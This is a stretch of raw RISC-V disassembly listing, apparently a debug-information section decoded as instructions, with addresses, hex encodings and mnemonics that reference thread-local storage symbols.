     2d0:	00ea                	slli	ra,ra,0x1a
     2d2:	0000                	unimp
     2d4:	02e87607          	0x2e87607
     2d8:	0000                	unimp
     2da:	0b00                	addi	s0,sp,400
     2dc:	0658                	addi	a4,sp,772
     2de:	0000                	unimp
     2e0:	00547707          	0x547707
     2e4:	0000                	unimp
     2e6:	0008                	0x8
     2e8:	003f080f          	0x3f080f
     2ec:	0000                	unimp
     2ee:	e30d                	bnez	a4,310 <_tbss_end+0x28c>
     2f0:	b0000003          	lb	zero,-1280(zero) # fffffffffffffb00 <_end+0xffffffff7ffe4880>
     2f4:	0418b507          	fld	fa0,65(a7)
     2f8:	0000                	unimp
     2fa:	5f0e                	lw	t5,224(sp)
     2fc:	0070                	addi	a2,sp,12
     2fe:	02e8b607          	fld	fa2,46(a7)
     302:	0000                	unimp
     304:	0e00                	addi	s0,sp,784
     306:	725f 0700 54b7      	0x54b70700725f
     30c:	0000                	unimp
     30e:	0800                	addi	s0,sp,16
     310:	5f0e                	lw	t5,224(sp)
     312:	b8070077          	0xb8070077
     316:	0054                	addi	a3,sp,4
     318:	0000                	unimp
     31a:	0b0c                	addi	a1,sp,400
     31c:	00000123          	sb	zero,2(zero) # 2 <_tdata_begin+0x2>
     320:	0046b907          	fld	fs2,4(a3)
     324:	0000                	unimp
     326:	0b10                	addi	a2,sp,400
     328:	0000020f          	0x20f
     32c:	0046ba07          	fld	fs4,4(a3)
     330:	0000                	unimp
     332:	0e12                	slli	t3,t3,0x4
     334:	625f 0066 bb07      	0xbb070066625f
     33a:	000002c3          	fmadd.s	ft5,ft0,ft0,ft0,rne
     33e:	0b18                	addi	a4,sp,400
     340:	007f                	0x7f
     342:	0000                	unimp
     344:	0054bc07          	fld	fs8,5(s1)
     348:	0000                	unimp
     34a:	0b28                	addi	a0,sp,408
     34c:	00000113          	li	sp,0
     350:	0127c307          	flq	ft6,18(a5)
     354:	0000                	unimp
     356:	0b30                	addi	a2,sp,408
     358:	000001cf          	fnmadd.s	ft3,ft0,ft0,ft0,rne
     35c:	0585c507          	flq	fa0,88(a1)
     360:	0000                	unimp
     362:	0b38                	addi	a4,sp,408
     364:	027f                	0x27f
     366:	0000                	unimp
     368:	05afc707          	flq	fa4,90(t6)
     36c:	0000                	unimp
     36e:	0b40                	addi	s0,sp,404
     370:	0466                	slli	s0,s0,0x19
     372:	0000                	unimp
     374:	05d3ca07          	flq	fs4,93(t2)
     378:	0000                	unimp
     37a:	0b48                	addi	a0,sp,404
     37c:	0582                	slli	a1,a1,0x0
     37e:	0000                	unimp
     380:	05edcb07          	flq	fs6,94(s11)
     384:	0000                	unimp
     386:	0e50                	addi	a2,sp,788
     388:	755f 0062 ce07      	0xce070062755f
     38e:	000002c3          	fmadd.s	ft5,ft0,ft0,ft0,rne
     392:	0e58                	addi	a4,sp,788
     394:	755f 0070 cf07      	0xcf070070755f
     39a:	02e8                	addi	a0,sp,332
     39c:	0000                	unimp
     39e:	0e68                	addi	a0,sp,796
     3a0:	755f 0072 d007      	0xd0070072755f
     3a6:	0054                	addi	a3,sp,4
     3a8:	0000                	unimp
     3aa:	0b70                	addi	a2,sp,412
     3ac:	00e4                	addi	s1,sp,76
     3ae:	0000                	unimp
     3b0:	05f3d307          	0x5f3d307
     3b4:	0000                	unimp
     3b6:	0b74                	addi	a3,sp,412
     3b8:	055a                	slli	a0,a0,0x16
     3ba:	0000                	unimp
     3bc:	0603d407          	0x603d407
     3c0:	0000                	unimp
     3c2:	6c5f0e77          	0x6c5f0e77
     3c6:	0062                	c.slli	zero,0x18
     3c8:	02c3d707          	0x2c3d707
     3cc:	0000                	unimp
     3ce:	0b78                	addi	a4,sp,412
     3d0:	0145                	addi	sp,sp,17
     3d2:	0000                	unimp
     3d4:	0054da07          	0x54da07
     3d8:	0000                	unimp
     3da:	0b88                	addi	a0,sp,464
     3dc:	0156                	slli	sp,sp,0x15
     3de:	0000                	unimp
     3e0:	0094db07          	0x94db07
     3e4:	0000                	unimp
     3e6:	0b90                	addi	a2,sp,464
     3e8:	0000061b          	sext.w	a2,zero
     3ec:	0436de07          	0x436de07
     3f0:	0000                	unimp
     3f2:	0b98                	addi	a4,sp,464
     3f4:	0271                	addi	tp,tp,28
     3f6:	0000                	unimp
     3f8:	011ce207          	0x11ce207
     3fc:	0000                	unimp
     3fe:	0ba0                	addi	s0,sp,472
     400:	000003eb          	0x3eb
     404:	0111e407          	0x111e407
     408:	0000                	unimp
     40a:	0ba4                	addi	s1,sp,472
     40c:	00000277          	0x277
     410:	0054e507          	0x54e507
     414:	0000                	unimp
     416:	00ac                	addi	a1,sp,72
     418:	0000aa13          	slti	s4,ra,0
     41c:	3600                	fld	fs0,40(a2)
     41e:	0004                	0x4
     420:	1400                	addi	s0,sp,544
     422:	0436                	slli	s0,s0,0xd
     424:	0000                	unimp
     426:	2714                	fld	fa3,8(a4)
     428:	0001                	nop
     42a:	1400                	addi	s0,sp,544
     42c:	00000573          	0x573
     430:	5414                	lw	a3,40(s0)
     432:	0000                	unimp
     434:	0000                	unimp
     436:	0441080f          	0x441080f
     43a:	0000                	unimp
     43c:	3615                	addiw	a2,a2,-27
     43e:	0004                	0x4
     440:	1600                	addi	s0,sp,800
     442:	0449                	addi	s0,s0,18
     444:	0000                	unimp
     446:	0748                	addi	a0,sp,900
     448:	73023907          	fld	fs2,1840(tp) # fffffffffffe1730 <_end+0xffffffff7ffc64b0>
     44c:	0005                	c.nop	1
     44e:	1700                	addi	s0,sp,928
     450:	03a9                	addi	t2,t2,10
     452:	0000                	unimp
     454:	54023b07          	fld	fs6,1344(tp) # 540 <_tbss_end+0x4bc>
     458:	0000                	unimp
     45a:	0000                	unimp
     45c:	00013217          	auipc	tp,0x13
     460:	0700                	addi	s0,sp,896
     462:	0240                	addi	s0,sp,260
     464:	065a                	slli	a2,a2,0x16
     466:	0000                	unimp
     468:	1708                	addi	a0,sp,928
     46a:	000001f7          	0x1f7
     46e:	5a024007          	flq	ft0,1440(tp) # 139fc <_tbss_end+0x13978>
     472:	0006                	c.slli	zero,0x1
     474:	1000                	addi	s0,sp,32
     476:	0001b017          	auipc	zero,0x1b
     47a:	0700                	addi	s0,sp,896
     47c:	0240                	addi	s0,sp,260
     47e:	065a                	slli	a2,a2,0x16
     480:	0000                	unimp
     482:	1718                	addi	a4,sp,928
     484:	040c                	addi	a1,sp,512
     486:	0000                	unimp
     488:	54024207          	flq	ft4,1344(tp) # 540 <_tbss_end+0x4bc>
     48c:	0000                	unimp
     48e:	2000                	fld	fs0,0(s0)
     490:	00001d17          	auipc	s10,0x1
     494:	0700                	addi	s0,sp,896
     496:	08450243          	fmadd.s	ft4,fa0,ft4,ft1,rne
     49a:	0000                	unimp
     49c:	1724                	addi	s1,sp,936
     49e:	0428                	addi	a0,sp,520
     4a0:	0000                	unimp
     4a2:	54024607          	flq	fa2,1344(tp) # 540 <_tbss_end+0x4bc>
     4a6:	0000                	unimp
     4a8:	4000                	lw	s0,0(s0)
     4aa:	00041617          	auipc	a2,0x41
     4ae:	0700                	addi	s0,sp,896
     4b0:	085a0247          	fmsub.s	ft4,fs4,ft5,ft1,rne
     4b4:	0000                	unimp
     4b6:	1748                	addi	a0,sp,932
     4b8:	0000033b          	addw	t1,zero,zero
     4bc:	54024907          	flq	fs2,1344(tp) # 540 <_tbss_end+0x4bc>
     4c0:	0000                	unimp
     4c2:	5000                	lw	s0,32(s0)
     4c4:	00041e17          	auipc	t3,0x41
     4c8:	0700                	addi	s0,sp,896
     4ca:	086b024b          	fnmsub.s	ft4,fs6,ft6,ft1,rne
     4ce:	0000                	unimp
     4d0:	1758                	addi	a4,sp,932
     4d2:	025c                	addi	a5,sp,260
     4d4:	0000                	unimp
     4d6:	87024e07          	flq	ft8,-1936(tp) # fffffffffffff870 <_end+0xffffffff7ffe45f0>
     4da:	0001                	nop
     4dc:	6000                	ld	s0,0(s0)
     4de:	0001d517          	auipc	a0,0x1d
     4e2:	0700                	addi	s0,sp,896
     4e4:	0054024f          	fnmadd.s	ft4,fs0,ft5,ft0,rne
     4e8:	0000                	unimp
     4ea:	1768                	addi	a0,sp,940
     4ec:	05aa                	slli	a1,a1,0xa
     4ee:	0000                	unimp
     4f0:	87025007          	0x87025007
     4f4:	0001                	nop
     4f6:	7000                	ld	s0,32(s0)
     4f8:	00036217          	auipc	tp,0x36
     4fc:	0700                	addi	s0,sp,896
     4fe:	0251                	addi	tp,tp,20
     500:	0871                	addi	a6,a6,28
     502:	0000                	unimp
     504:	1778                	addi	a4,sp,940
     506:	01ff                	0x1ff
     508:	0000                	unimp
     50a:	54025407          	0x54025407
     50e:	0000                	unimp
     510:	8000                	0x8000
     512:	00014e17          	auipc	t3,0x14
     516:	0700                	addi	s0,sp,896
     518:	0255                	addi	tp,tp,21
     51a:	00000573          	0x573
     51e:	1788                	addi	a0,sp,992
     520:	03a2                	slli	t2,t2,0x8
     522:	0000                	unimp
     524:	22027807          	0x22027807
     528:	0008                	0x8
     52a:	9000                	0x9000
     52c:	3318                	fld	fa4,32(a4)
     52e:	07000003          	lb	zero,112(zero) # 1b4e6 <_tbss_end+0x1b462>
     532:	027c                	addi	a5,sp,268
     534:	02a6                	slli	t0,t0,0x9
     536:	0000                	unimp
     538:	01f8                	addi	a4,sp,204
     53a:	2f18                	fld	fa4,24(a4)
     53c:	0002                	c.slli	zero,0x0
     53e:	0700                	addi	s0,sp,896
     540:	027d                	addi	tp,tp,31
     542:	00000267          	jalr	tp,zero
     546:	0200                	addi	s0,sp,256
     548:	5018                	lw	a4,32(s0)
     54a:	0005                	c.nop	1
     54c:	0700                	addi	s0,sp,896
     54e:	0281                	addi	t0,t0,0
     550:	0882                	slli	a7,a7,0x0
     552:	0000                	unimp
     554:	0518                	addi	a4,sp,640
     556:	1b18                	addi	a4,sp,432
     558:	0001                	nop
     55a:	0700                	addi	s0,sp,896
     55c:	0286                	slli	t0,t0,0x1
     55e:	061f 0000 0520      	0x5200000061f
     564:	0018                	0x18
     566:	0001                	nop
     568:	0700                	addi	s0,sp,896
     56a:	088e0287          	0x88e0287
     56e:	0000                	unimp
     570:	0538                	addi	a4,sp,648
     572:	0f00                	addi	s0,sp,912
     574:	7908                	ld	a0,48(a0)
     576:	0005                	c.nop	1
     578:	0200                	addi	s0,sp,256
     57a:	0801                	addi	a6,a6,0
     57c:	0394                	addi	a3,sp,448
     57e:	0000                	unimp
     580:	7915                	lui	s2,0xfffe5
     582:	0005                	c.nop	1
     584:	0f00                	addi	s0,sp,912
     586:	1808                	addi	a0,sp,48
     588:	0004                	0x4
     58a:	1300                	addi	s0,sp,416
     58c:	00aa                	slli	ra,ra,0xa
     58e:	0000                	unimp
     590:	05a9                	addi	a1,a1,10
     592:	0000                	unimp
     594:	3614                	fld	fa3,40(a2)
     596:	0004                	0x4
     598:	1400                	addi	s0,sp,544
     59a:	00000127          	0x127
     59e:	a914                	fsd	fa3,16(a0)
     5a0:	0005                	c.nop	1
     5a2:	1400                	addi	s0,sp,544
     5a4:	0054                	addi	a3,sp,4
     5a6:	0000                	unimp
     5a8:	0f00                	addi	s0,sp,912
     5aa:	8008                	0x8008
     5ac:	0005                	c.nop	1
     5ae:	0f00                	addi	s0,sp,912
     5b0:	8b08                	0x8b08
     5b2:	0005                	c.nop	1
     5b4:	1300                	addi	s0,sp,416
     5b6:	009f 0000 05d3      	0x5d30000009f
     5bc:	0000                	unimp
     5be:	3614                	fld	fa3,40(a2)
     5c0:	0004                	0x4
     5c2:	1400                	addi	s0,sp,544
     5c4:	00000127          	0x127
     5c8:	9f14                	0x9f14
     5ca:	0000                	unimp
     5cc:	1400                	addi	s0,sp,544
     5ce:	0054                	addi	a3,sp,4
     5d0:	0000                	unimp
     5d2:	0f00                	addi	s0,sp,912
     5d4:	b508                	fsd	fa0,40(a0)
     5d6:	0005                	c.nop	1
     5d8:	1300                	addi	s0,sp,416
     5da:	0054                	addi	a3,sp,4
     5dc:	0000                	unimp
     5de:	05ed                	addi	a1,a1,27
     5e0:	0000                	unimp
     5e2:	3614                	fld	fa3,40(a2)
     5e4:	0004                	0x4
     5e6:	1400                	addi	s0,sp,544
     5e8:	00000127          	0x127
     5ec:	0f00                	addi	s0,sp,912
     5ee:	d908                	sw	a0,48(a0)
     5f0:	0005                	c.nop	1
     5f2:	0800                	addi	s0,sp,16
     5f4:	0000003f 00000603 	0x6030000003f
     5fc:	7409                	lui	s0,0xfffe2
     5fe:	0000                	unimp
     600:	0200                	addi	s0,sp,256
     602:	0800                	addi	s0,sp,16
     604:	0000003f 00000613 	0x6130000003f
     60c:	7409                	lui	s0,0xfffe2
     60e:	0000                	unimp
     610:	0000                	unimp
     612:	0500                	addi	s0,sp,640
     614:	03d1                	addi	t2,t2,20
     616:	0000                	unimp
     618:	ee011f07          	0xee011f07
     61c:	0002                	c.slli	zero,0x0
     61e:	1900                	addi	s0,sp,176
     620:	00000537          	lui	a0,0x0
     624:	0718                	addi	a4,sp,896
     626:	06540123          	sb	t0,98(s0) # fffffffffffe2062 <_end+0xffffffff7ffc6de2>
     62a:	0000                	unimp
     62c:	0003f917          	auipc	s2,0x3f
     630:	0700                	addi	s0,sp,896
     632:	0125                	addi	sp,sp,9
     634:	0654                	addi	a3,sp,772
     636:	0000                	unimp
     638:	1700                	addi	s0,sp,928
     63a:	0215                	addi	tp,tp,5
     63c:	0000                	unimp
     63e:	54012607          	flw	fa2,1344(sp)
     642:	0000                	unimp
     644:	0800                	addi	s0,sp,16
     646:	0003cb17          	auipc	s6,0x3c
     64a:	0700                	addi	s0,sp,896
     64c:	065a0127          	0x65a0127
     650:	0000                	unimp
     652:	0010                	0x10
     654:	061f080f          	0x61f080f
     658:	0000                	unimp
     65a:	0613080f          	0x613080f
     65e:	0000                	unimp
     660:	1519                	addi	a0,a0,-26
     662:	0000                	unimp
     664:	0e00                	addi	s0,sp,784
     666:	95013f07          	fld	ft10,-1712(sp)
     66a:	0006                	c.slli	zero,0x1
     66c:	1700                	addi	s0,sp,928
     66e:	0450                	addi	a2,sp,516
     670:	0000                	unimp
     672:	95014007          	flq	ft0,-1712(sp)
     676:	0006                	c.slli	zero,0x1
     678:	0000                	unimp
     67a:	0004c717          	auipc	a4,0x4c
     67e:	0700                	addi	s0,sp,896
     680:	0141                	addi	sp,sp,16
     682:	0695                	addi	a3,a3,5
     684:	0000                	unimp
     686:	1706                	slli	a4,a4,0x21
     688:	000004e3          	beqz	zero,e90 <_tbss_end+0xe0c>
     68c:	4d014207          	flq	ft4,1232(sp)
     690:	0000                	unimp
     692:	0c00                	addi	s0,sp,528
     694:	0800                	addi	s0,sp,16
     696:	004d                	c.nop	19
     698:	0000                	unimp
     69a:	06a5                	addi	a3,a3,9
     69c:	0000                	unimp
     69e:	7409                	lui	s0,0xfffe2
     6a0:	0000                	unimp
     6a2:	0200                	addi	s0,sp,256
     6a4:	1a00                	addi	s0,sp,304
     6a6:	07d8                	addi	a4,sp,964
     6a8:	0259                	addi	tp,tp,22
     6aa:	07a6                	slli	a5,a5,0x9
     6ac:	0000                	unimp
     6ae:	00051b17          	auipc	s6,0x51
     6b2:	0700                	addi	s0,sp,896
     6b4:	005b025b          	0x5b025b
     6b8:	0000                	unimp
     6ba:	1700                	addi	s0,sp,928
     6bc:	04cd                	addi	s1,s1,19
     6be:	0000                	unimp
     6c0:	73025c07          	0x73025c07
     6c4:	0005                	c.nop	1
     6c6:	0800                	addi	s0,sp,16
     6c8:	00024f17          	auipc	t5,0x24
     6cc:	0700                	addi	s0,sp,896
     6ce:	025d                	addi	tp,tp,23
     6d0:	07a6                	slli	a5,a5,0x9
     6d2:	0000                	unimp
     6d4:	1710                	addi	a2,sp,928
     6d6:	00000573          	0x573
     6da:	9d025e07          	0x9d025e07
     6de:	0001                	nop
     6e0:	2c00                	fld	fs0,24(s0)
     6e2:	0001c017          	auipc	zero,0x1c
     6e6:	0700                	addi	s0,sp,896
     6e8:	025f 0054 0000      	0x54025f
     6ee:	1750                	addi	a2,sp,932
     6f0:	03f4                	addi	a3,sp,460
     6f2:	0000                	unimp
     6f4:	b6026007          	0xb6026007
     6f8:	58000007          	0x58000007
     6fc:	00058917          	auipc	s2,0x58
     700:	0700                	addi	s0,sp,896
     702:	0261                	addi	tp,tp,24
     704:	0660                	addi	s0,sp,780
     706:	0000                	unimp
     708:	1760                	addi	s0,sp,940
     70a:	03ff                	0x3ff
     70c:	0000                	unimp
     70e:	11026207          	0x11026207
     712:	0001                	nop
     714:	7000                	ld	s0,32(s0)
     716:	00059417          	auipc	s0,0x59
     71a:	0700                	addi	s0,sp,896
     71c:	01110263          	beq	sp,a7,720 <_tbss_end+0x69c>
     720:	0000                	unimp
     722:	1778                	addi	a4,sp,940
     724:	00b5                	addi	ra,ra,13
     726:	0000                	unimp
     728:	11026407          	0x11026407
     72c:	0001                	nop
     72e:	8000                	0x8000
     730:	00054617          	auipc	a2,0x54
     734:	0700                	addi	s0,sp,896
     736:	0265                	addi	tp,tp,25
     738:	07bd                	addi	a5,a5,15
     73a:	0000                	unimp
     73c:	1788                	addi	a0,sp,992
     73e:	00000243          	fmadd.s	ft4,ft0,ft0,ft0,rne
     742:	cd026607          	0xcd026607
     746:	90000007          	0x90000007
     74a:	0004f017          	auipc	zero,0x4f
     74e:	0700                	addi	s0,sp,896
     750:	00540267          	jalr	tp,5(s0) # 5971b <_tbss_end+0x59697>
     754:	0000                	unimp
     756:	17a8                	addi	a0,sp,1000
     758:	0000016f          	jal	sp,758 <_tbss_end+0x6d4>
     75c:	11026807          	0x11026807
     760:	0001                	nop
     762:	ac00                	fsd	fs0,24(s0)
     764:	0000a617          	auipc	a2,0xa
     768:	0700                	addi	s0,sp,896
     76a:	0269                	addi	tp,tp,26
     76c:	0111                	addi	sp,sp,4
     76e:	0000                	unimp
     770:	17b4                	addi	a3,sp,1000
     772:	015e                	slli	sp,sp,0x17
     774:	0000                	unimp
     776:	11026a07          	0x11026a07
     77a:	0001                	nop
     77c:	bc00                	fsd	fs0,56(s0)
     77e:	00003c17          	auipc	s8,0x3
     782:	0700                	addi	s0,sp,896
     784:	0111026b          	0x111026b
     788:	0000                	unimp
     78a:	17c4                	addi	s1,sp,996
     78c:	0000004b          	fnmsub.s	ft0,ft0,ft0,ft0,rne
     790:	11026c07          	0x11026c07
     794:	0001                	nop
     796:	cc00                	sw	s0,24(s0)
     798:	0003a717          	auipc	a4,0x3a
     79c:	0700                	addi	s0,sp,896
     79e:	026d                	addi	tp,tp,27
     7a0:	0054                	addi	a3,sp,4
     7a2:	0000                	unimp
     7a4:	00d4                	addi	a3,sp,68
     7a6:	7908                	ld	a0,48(a0)
     7a8:	0005                	c.nop	1
     7aa:	b600                	fsd	fs0,40(a2)
     7ac:	09000007          	0x9000007
     7b0:	0074                	addi	a3,sp,12
     7b2:	0000                	unimp
     7b4:	0019                	c.nop	6
     7b6:	0802                	slli	a6,a6,0x0
     7b8:	00005c07          	0x5c07
     7bc:	0800                	addi	s0,sp,16
     7be:	0579                	addi	a0,a0,30
     7c0:	0000                	unimp
     7c2:	07cd                	addi	a5,a5,19
     7c4:	0000                	unimp
     7c6:	7409                	lui	s0,0xfffe2
     7c8:	0000                	unimp
     7ca:	0700                	addi	s0,sp,896
     7cc:	0800                	addi	s0,sp,16
     7ce:	0579                	addi	a0,a0,30
     7d0:	0000                	unimp
     7d2:	07dd                	addi	a5,a5,23
     7d4:	0000                	unimp
     7d6:	7409                	lui	s0,0xfffe2
     7d8:	0000                	unimp
     7da:	1700                	addi	s0,sp,928
     7dc:	1b00                	addi	s0,sp,432
     7de:	0168                	addi	a0,sp,140
     7e0:	02027207          	0x2027207
     7e4:	0008                	0x8
     7e6:	1700                	addi	s0,sp,928
     7e8:	0316                	slli	t1,t1,0x5
     7ea:	0000                	unimp
     7ec:	02027507          	0x2027507
     7f0:	0008                	0x8
     7f2:	0000                	unimp
     7f4:	0002f717          	auipc	a4,0x2f
     7f8:	0700                	addi	s0,sp,896
     7fa:	0276                	slli	tp,tp,0x1d
     7fc:	0812                	slli	a6,a6,0x4
     7fe:	0000                	unimp
     800:	00f0                	addi	a2,sp,76
     802:	e808                	sd	a0,16(s0)
     804:	0002                	c.slli	zero,0x0
     806:	1200                	addi	s0,sp,288
     808:	0008                	0x8
     80a:	0900                	addi	s0,sp,144
     80c:	0074                	addi	a3,sp,12
     80e:	0000                	unimp
     810:	001d                	c.nop	7
     812:	5b08                	lw	a0,48(a4)
     814:	0000                	unimp
     816:	2200                	fld	fs0,0(a2)
     818:	0008                	0x8
     81a:	0900                	addi	s0,sp,144
     81c:	0074                	addi	a3,sp,12
     81e:	0000                	unimp
     820:	001d                	c.nop	7
     822:	681c                	ld	a5,16(s0)
     824:	0701                	addi	a4,a4,0
     826:	08450257          	0x8450257
     82a:	0000                	unimp
     82c:	491d                	li	s2,7
     82e:	0004                	0x4
     830:	0700                	addi	s0,sp,896
     832:	026e                	slli	tp,tp,0x1b
     834:	06a5                	addi	a3,a3,9
     836:	0000                	unimp
     838:	601d                	c.lui	zero,0x7
     83a:	0005                	c.nop	1
     83c:	0700                	addi	s0,sp,896
     83e:	07dd0277          	0x7dd0277
     842:	0000                	unimp
     844:	0800                	addi	s0,sp,16
     846:	0579                	addi	a0,a0,30
     848:	0000                	unimp
     84a:	0855                	addi	a6,a6,21
     84c:	0000                	unimp
     84e:	7409                	lui	s0,0xfffe2
     850:	0000                	unimp
     852:	1800                	addi	s0,sp,48
     854:	1e00                	addi	s0,sp,816
     856:	0092                	slli	ra,ra,0x4
     858:	0000                	unimp
     85a:	0855080f          	0x855080f
     85e:	0000                	unimp
     860:	6b1f 0008 1400      	0x140000086b1f
     866:	0436                	slli	s0,s0,0xd
     868:	0000                	unimp
     86a:	0f00                	addi	s0,sp,912
     86c:	6008                	ld	a0,0(s0)
     86e:	0008                	0x8
     870:	0f00                	addi	s0,sp,912
     872:	8708                	0x8708
     874:	0001                	nop
     876:	1f00                	addi	s0,sp,944
     878:	0882                	slli	a7,a7,0x0
     87a:	0000                	unimp
     87c:	5414                	lw	a3,40(s0)
     87e:	0000                	unimp
     880:	0000                	unimp
     882:	0888080f          	0x888080f
     886:	0000                	unimp
     888:	0877080f          	0x877080f
     88c:	0000                	unimp
     88e:	1308                	addi	a0,sp,416
     890:	0006                	c.slli	zero,0x1
     892:	9e00                	0x9e00
     894:	0008                	0x8
     896:	0900                	addi	s0,sp,144
     898:	0074                	addi	a3,sp,12
     89a:	0000                	unimp
     89c:	0002                	c.slli	zero,0x0
     89e:	0420                	addi	s0,sp,520
     8a0:	0005                	c.nop	1
     8a2:	0700                	addi	s0,sp,896
     8a4:	02fe                	slli	t0,t0,0x1f
     8a6:	0436                	slli	s0,s0,0xd
     8a8:	0000                	unimp
     8aa:	fd20                	sd	s0,120(a0)
     8ac:	0004                	0x4
     8ae:	0700                	addi	s0,sp,896
     8b0:	02ff                	0x2ff
     8b2:	043c                	addi	a5,sp,520
     8b4:	0000                	unimp
     8b6:	00002a03          	lw	s4,0(zero) # 7000 <_tbss_end+0x6f7c>
     8ba:	0800                	addi	s0,sp,16
     8bc:	3418                	fld	fa4,40(s0)
     8be:	0000                	unimp
     8c0:	0300                	addi	s0,sp,384
     8c2:	0359                	addi	t1,t1,22
     8c4:	0000                	unimp
     8c6:	3c08                	fld	fa0,56(s0)
     8c8:	0069                	c.nop	26
     8ca:	0000                	unimp
     8cc:	b608                	fsd	fa0,40(a2)
     8ce:	0008                	0x8
     8d0:	df00                	sw	s0,56(a4)
     8d2:	0008                	0x8
     8d4:	2100                	fld	fs0,0(a0)
     8d6:	0074                	addi	a3,sp,12
     8d8:	0000                	unimp
     8da:	3fff                	0x3fff
     8dc:	0001                	nop
     8de:	2200                	fld	fs0,0(a2)
     8e0:	0399                	addi	t2,t2,6
     8e2:	0000                	unimp
     8e4:	3901                	addiw	s2,s2,-32
     8e6:	08cc                	addi	a1,sp,84
     8e8:	0000                	unimp
     8ea:	0309                	addi	t1,t1,2
     8ec:	2a40                	fld	fs0,144(a2)
     8ee:	8000                	0x8000
     8f0:	0000                	unimp
     8f2:	0000                	unimp
     8f4:	b608                	fsd	fa0,40(a2)
     8f6:	0008                	0x8
     8f8:	0500                	addi	s0,sp,640
     8fa:	0009                	c.nop	2
     8fc:	2300                	fld	fs0,0(a4)
     8fe:	0074                	addi	a3,sp,12
     900:	0000                	unimp
     902:	3fff                	0x3fff
     904:	2200                	fld	fs0,0(a2)
     906:	00000073          	ecall
     90a:	0d02                	slli	s10,s10,0x0
     90c:	08f4                	addi	a3,sp,92
     90e:	0000                	unimp
     910:	0309                	addi	t1,t1,2
     912:	6a40                	ld	s0,144(a2)
     914:	8001                	srli	s0,s0,0x0
     916:	0000                	unimp
     918:	0000                	unimp
     91a:	1d22                	slli	s10,s10,0x28
     91c:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     920:	730e                	ld	t1,224(sp)
     922:	0005                	c.nop	1
     924:	0900                	addi	s0,sp,144
     926:	002a3803          	ld	a6,2(s4)
     92a:	0080                	addi	s0,sp,64
     92c:	0000                	unimp
     92e:	2400                	fld	fs0,8(s0)
     930:	000005af          	0x5af
     934:	3d02                	fld	fs10,32(sp)
     936:	0054                	addi	a3,sp,4
     938:	0000                	unimp
     93a:	125a                	slli	tp,tp,0x36
     93c:	8000                	0x8000
     93e:	0000                	unimp
     940:	0000                	unimp
     942:	0282                	slli	t0,t0,0x0
     944:	0000                	unimp
     946:	0000                	unimp
     948:	0000                	unimp
     94a:	9c01                	subw	s0,s0,s0
     94c:	0a89                	addi	s5,s5,2
     94e:	0000                	unimp
     950:	8e25                	xor	a2,a2,s1
     952:	0005                	c.nop	1
     954:	0200                	addi	s0,sp,256
     956:	c13e                	sw	a5,128(sp)
     958:	0008                	0x8
     95a:	0300                	addi	s0,sp,384
     95c:	b891                	j	1b0 <_tbss_end+0x12c>
     95e:	257f                	0x257f
     960:	008d                	addi	ra,ra,3
     962:	0000                	unimp
     964:	3e02                	fld	ft8,32(sp)
     966:	08c1                	addi	a7,a7,16
     968:	0000                	unimp
     96a:	7fa89103          	lh	sp,2042(a7)
     96e:	f025                	bnez	s0,8ce <_tbss_end+0x84a>
     970:	0000                	unimp
     972:	0200                	addi	s0,sp,256
     974:	0008b63f 6f910200 	0x6f9102000008b63f
     97c:	a225                	j	aa4 <_tbss_end+0xa20>
     97e:	0005                	c.nop	1
     980:	0200                	addi	s0,sp,256
     982:	8940                	0x8940
     984:	000a                	c.slli	zero,0x2
     986:	0900                	addi	s0,sp,144
     988:	01aa4003          	lbu	zero,26(s4)
     98c:	0080                	addi	s0,sp,64
     98e:	0000                	unimp
     990:	2600                	fld	fs0,8(a2)
     992:	128a                	slli	t0,t0,0x22
     994:	8000                	0x8000
     996:	0000                	unimp
     998:	0000                	unimp
     99a:	0246                	slli	tp,tp,0x11
     99c:	0000                	unimp
     99e:	0000                	unimp
     9a0:	0000                	unimp
     9a2:	5725                	li	a4,-23
     9a4:	0001                	nop
     9a6:	0200                	addi	s0,sp,256
     9a8:	c145                	beqz	a0,a48 <_tbss_end+0x9c4>
     9aa:	0008                	0x8
     9ac:	0200                	addi	s0,sp,256
     9ae:	6091                	lui	ra,0x4
     9b0:	9026                	c.add	zero,s1
     9b2:	0012                	c.slli	zero,0x4
     9b4:	0080                	addi	s0,sp,64
     9b6:	0000                	unimp
     9b8:	2c00                	fld	fs0,24(s0)
     9ba:	0002                	c.slli	zero,0x0
     9bc:	0000                	unimp
     9be:	0000                	unimp
     9c0:	2500                	fld	fs0,8(a0)
     9c2:	02e9                	addi	t0,t0,26
     9c4:	0000                	unimp
     9c6:	6a02                	ld	s4,0(sp)
     9c8:	0a99                	addi	s5,s5,6
     9ca:	0000                	unimp
     9cc:	7fa09103          	lh	sp,2042(ra) # 47fa <_tbss_end+0x4776>
     9d0:	9d25                	addw	a0,a0,s1
     9d2:	0000                	unimp
     9d4:	0200                	addi	s0,sp,256
     9d6:	000aa96b          	0xaa96b
     9da:	0300                	addi	s0,sp,384
     9dc:	9091                	srli	s1,s1,0x24
     9de:	277f                	0x277f
     9e0:	1290                	addi	a2,sp,352
     9e2:	8000                	0x8000
     9e4:	0000                	unimp
     9e6:	0000                	unimp
     9e8:	0030                	addi	a2,sp,8
     9ea:	0000                	unimp
     9ec:	0000                	unimp
     9ee:	0000                	unimp
     9f0:	00000a03          	lb	s4,0(zero) # 0 <_tdata_begin>
     9f4:	b625                	j	51c <_tbss_end+0x498>
     9f6:	0004                	0x4
     9f8:	0200                	addi	s0,sp,256
     9fa:	c148                	sw	a0,4(a0)
     9fc:	0008                	0x8
     9fe:	0200                	addi	s0,sp,256
     a00:	5891                	li	a7,-28
     a02:	2600                	fld	fs0,8(a2)
     a04:	12c0                	addi	s0,sp,356
     a06:	8000                	0x8000
     a08:	0000                	unimp
     a0a:	0000                	unimp
     a0c:	00d6                	slli	ra,ra,0x15
     a0e:	0000                	unimp
     a10:	0000                	unimp
     a12:	0000                	unimp
     a14:	0c25                	addi	s8,s8,9
     a16:	0000                	unimp
     a18:	0200                	addi	s0,sp,256
     a1a:	c14d                	beqz	a0,abc <_tbss_end+0xa38>
     a1c:	0008                	0x8
     a1e:	0200                	addi	s0,sp,256
     a20:	5091                	li	ra,-28
     a22:	ec26                	sd	s1,24(sp)
     a24:	0012                	c.slli	zero,0x4
     a26:	0080                	addi	s0,sp,64
     a28:	0000                	unimp
     a2a:	9600                	0x9600
     a2c:	0000                	unimp
     a2e:	0000                	unimp
     a30:	0000                	unimp
     a32:	2800                	fld	fs0,16(s0)
     a34:	0069                	c.nop	26
     a36:	5c02                	lw	s8,32(sp)
     a38:	08c1                	addi	a7,a7,16
     a3a:	0000                	unimp
     a3c:	9102                	jalr	sp
